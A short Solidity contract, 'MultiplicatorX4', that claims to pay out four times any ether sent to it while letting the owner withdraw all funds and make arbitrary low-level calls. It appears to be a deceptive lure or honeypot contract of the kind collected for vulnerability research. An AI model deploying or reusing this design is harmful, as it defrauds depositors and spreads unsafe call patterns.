pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiplicat(address _adr) public payable {
        require(msg.value > 0 && this.balance >= msg.value);
        require(_adr.call.value(msg.value*4)());
    }
}